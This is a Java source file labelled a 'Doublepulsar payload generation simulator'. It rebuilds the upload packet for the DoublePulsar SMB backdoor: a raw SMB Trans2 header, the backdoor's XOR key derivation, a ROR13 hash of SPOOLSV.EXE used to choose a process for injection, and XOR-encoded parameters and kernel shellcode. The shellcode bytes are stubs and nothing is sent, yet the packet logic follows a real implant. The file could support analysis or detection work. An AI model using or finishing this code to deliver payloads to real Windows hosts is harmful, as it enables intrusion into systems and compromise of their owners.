import java.nio.*; //import java.nio.ByteBuffer;
import java.util.*;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import java.io.UnsupportedEncodingException;
/*
Doublepulsar payload generation simulator
*/

public class DoublepulsarUploadShellcode {
    
    public static byte[] trans2_exec = new byte[]{
            (byte) 0x00, (byte) 0x00, (byte) 0x10, (byte) 0x4e, (byte) 0xff, (byte) 0x53, (byte) 0x4d, (byte) 0x42,
            (byte) 0x32, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x18, (byte) 0x07, (byte) 0xc0,
            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x08, (byte) 0xff, (byte) 0xfe, (byte) 0x00,
            (byte) 0x08, (byte) 0x42, (byte) 0x00, (byte) 0x0f, (byte) 0x0c, (byte) 0x00, (byte) 0x00, (byte) 0x10,
            (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
            (byte) 0x25, (byte) 0x89, (byte) 0x1a, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0c, (byte) 0x00,
            (byte) 0x42, (byte) 0x00, (byte) 0x00, (byte) 0x10, (byte) 0x4e, (byte) 0x00, (byte) 0x01, (byte) 0x00,
            (byte) 0x0e, (byte) 0x00, (byte) 0x0d, (byte) 0x10, (byte) 0x00
        };
    
    public static byte[] byteXor(byte[] data, byte[] keyBytes) {
    byte[] result = new byte[data.length];
    int keyLength = keyBytes.length;

    for (int i = 0; i < data.length; i++) {
        result[i] = (byte) (data[i] ^ keyBytes[i % keyLength]);
    }

    return result;
    }
	
	    // Rotate Right (ROR) function
    static int ror(int dword, int bits) {
        return (dword >>> bits) | (dword << (32 - bits));
    }

    // Generate process hash
    static int generateProcessHash(String process) {
        int procHash = 0;

        for (int i = 0; i <= process.length(); i++) {
            procHash = ror(procHash, 13);
            procHash += (i < process.length()) ? (byte) process.charAt(i) : (byte) 0;
        }

        return procHash;
    }
	
    
   public static int ComputeDOUBLEPULSARXorKey(int sig) {
    return 2 * sig ^ ((((sig >>> 16) | (sig & 0xFF0000)) >>> 8) |
                      (((sig << 16) | (sig & 0xFF00)) << 8));
    }
	
	    // Convert 4-byte little-endian array to int
    public static int LE2INT(byte[] data) {
        return ((data[3] & 0xFF) << 24) |
               ((data[2] & 0xFF) << 16) |
               ((data[1] & 0xFF) << 8)  |
               (data[0] & 0xFF);
    }
    
    public static void main(String[] args) {
        // Equivalent to unsigned char signature[] = { 0x79, 0xe7, 0xdf, 0x90 };
        byte[] signature = {(byte) 0x79, (byte) 0xE7, (byte) 0xDF, (byte) 0x90};

        // Convert little-endian byte array to int
        int sig = LE2INT(signature);

        // Calculate XOR key
        int xorKey = ComputeDOUBLEPULSARXorKey(sig);

        System.out.printf("Calculated XOR KEY:  0x%08X%n", xorKey);

        // Split xorKey into 4 bytes (little-endian)
        byte[] byteXorKey = new byte[4];
        byteXorKey[0] = (byte) (xorKey & 0xFF);
        byteXorKey[1] = (byte) ((xorKey >> 8) & 0xFF);
        byteXorKey[2] = (byte) ((xorKey >> 16) & 0xFF);
        byteXorKey[3] = (byte) ((xorKey >> 24) & 0xFF);
		
		// Create a buffer of 4096 bytes
        byte[] buffer = new byte[4096];

        // Fill the buffer with 0x90
        for (int i = 0; i < buffer.length; i++) {
            buffer[i] = (byte) 0x00;
        }

        // Optional: print the first few bytes to verify
        for (int i = 0; i < 10; i++) {
            System.out.printf("buffer[%d] = 0x%02X%n", i, buffer[i]);
        }
		
		byte[] XorBytes = byteXor(buffer, byteXorKey);
		
		// Optional: print the first few bytes to verify
        for (int i = 0; i < 12; i++) {
            System.out.printf("Xored bytes buffer[%d] = 0x%02X%n", i, XorBytes[i]);
        }
        
        String procName = "SPOOLSV.EXE";
        int hash = generateProcessHash(procName);
        System.out.printf("Process Hash for %s: 0x%08X%n", procName, hash);
        
        /*
        ByteBuffer parameters = ByteBuffer.allocate(12);
        parameters.order(ByteOrder.LITTLE_ENDIAN);

        // First 4 bytes: 0x50D800
        parameters.putInt(0x0050D800); // Note: 0x50D800 fits into 4 bytes

        // Second 4 bytes: 4096
        parameters.putInt(4096);

        // Last 4 bytes: 0
        parameters.putInt(0);

        // Get the byte array
        byte[] byteArray = parameters.array();

        // Print the byte array in hex to verify
        for (byte b : byteArray) {
            System.out.printf("%02X ", b);
        }
        System.out.printf("\n\n");*/

    
        //copy bytebuffer to bytebuffer
        //https://stackoverflow.com/questions/3366925/deep-copy-duplicate-of-javas-bytebuffer
        
        byte[] Parameters = new byte[12];

        int firstValue = 0x507308; // 0x50D800
        int secondValue = 4096;
        int thirdValue = 0;

        // Manually place firstValue in little-endian
        Parameters[0] = (byte) (firstValue);
        Parameters[1] = (byte) ((firstValue >> 8) & 0xFF);
        Parameters[2] = (byte) ((firstValue >> 16) & 0xFF);
        Parameters[3] = (byte) ((firstValue >> 24) & 0xFF);

        // Manually place secondValue in little-endian
        Parameters[4] = (byte) (secondValue);
        Parameters[5] = (byte) ((secondValue >> 8) & 0xFF);
        Parameters[6] = (byte) ((secondValue >> 16) & 0xFF);
        Parameters[7] = (byte) ((secondValue >> 24) & 0xFF);

        // Manually place thirdValue in little-endian
        Parameters[8] = (byte) (thirdValue);
        Parameters[9] = (byte) ((thirdValue >> 8) & 0xFF);
        Parameters[10] = (byte) ((thirdValue >> 16) & 0xFF);
        Parameters[11] = (byte) ((thirdValue >> 24) & 0xFF);
        
        System.out.printf("SMB Parameters:  ");
        // Print the byte array in hex to verify
        for (byte b : Parameters) {
            System.out.printf("%02X ", b);
        }
        System.out.printf("\n");
        
        byte[] XorParameterBytes = byteXor(Parameters, byteXorKey);
        
        System.out.printf("XOR SMB Parameters:  ");
        // Print the XORed parameters byte array in hex to verify
        for (byte b : XorParameterBytes) {
            System.out.printf("%02X ", b);
        }
        System.out.printf("\n");
        
        byte[] hMem = new byte[4096];
        byte[] shellcode = new byte[] { (byte)0x31, (byte)0xc9, (byte)0x41 };
        byte[] shellcodePartTwo = new byte[] { (byte)0x49, (byte)0x8b, (byte)0x1e, (byte)0x4d };
        byte[] ring3 = new byte[200];
        
        int shellcodeOnePartLen = shellcode.length;
        int shellcodePartTwoLen = shellcodePartTwo.length;
        int ring3Len = ring3.length;
        int kernelShellcodeSize = shellcodeOnePartLen + shellcodePartTwoLen + 4;
        System.out.println("Total size of kernel shellcode: " + kernelShellcodeSize);
        
        // Fill the buffer with 0x90
        for (int i = 0; i < hMem.length; i++) {
            hMem[i] = (byte) 0x00;
        }
        System.arraycopy(shellcode, 0, hMem, 0, shellcodeOnePartLen);
        ByteBuffer.wrap(hMem, shellcodeOnePartLen, 4).order(ByteOrder.LITTLE_ENDIAN).putInt(hash);
        
        // Copy the second part of the shellcode into hMem
        System.arraycopy(shellcodePartTwo, 0, hMem, shellcodeOnePartLen + 4, shellcodePartTwoLen);

        // Add the length of ring3 (converted to short) into hMem
        ByteBuffer.wrap(hMem, kernelShellcodeSize, 2).order(ByteOrder.LITTLE_ENDIAN).putShort((short) ring3Len);

        // Copy the ring3 data into hMem
        System.arraycopy(ring3, 0, hMem, kernelShellcodeSize + 2, ring3Len);
        
        System.out.println("Shellcode prepared successfully.");
        
        byte[] XorPayload = byteXor(hMem, byteXorKey);
        
        // Create a new byte array to hold all three byte arrays
        byte[] doublepulsar_packet = new byte[4178];
        System.arraycopy(trans2_exec, 0, doublepulsar_packet, 0, trans2_exec.length);
        System.arraycopy(XorParameterBytes, 0, doublepulsar_packet, trans2_exec.length, XorParameterBytes.length);
        System.arraycopy(XorPayload, 0, doublepulsar_packet, trans2_exec.length + XorParameterBytes.length, XorPayload.length);
        
        // Print out the merged array to verify (Optional)
        System.out.println("Merged byte array length: " + doublepulsar_packet.length);
    
    }
}
